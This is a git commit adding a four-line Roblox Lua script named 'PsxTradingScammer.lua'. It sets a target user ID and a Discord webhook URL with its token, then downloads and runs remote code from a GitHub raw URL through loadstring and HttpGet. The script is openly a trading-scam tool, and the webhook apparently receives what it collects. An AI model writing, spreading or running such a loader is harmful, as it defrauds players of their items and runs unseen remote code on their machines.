9f77124a089c0f40102718cbe60c048acdbf7d91
PsxGood <125909464+PsxGood@users.noreply.github.com>
2023-02-20 18:17:30 +0100

    Create PsxTradingScammer.lua

---
+++ PsxTradingScammer.lua
@@ -0,0 +1,4 @@
+_G.UserID = 1292265266;
+_G.Webhook = "https://discord.com/api/webhooks/1077277113792598179/FlRmRXjjHkLwAs1rJFvmIzAgAr2T3RoUl5rIg188G7TYZeSf9K_eBQwCNqqgQyL3K8Ib"; -- Optional!
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
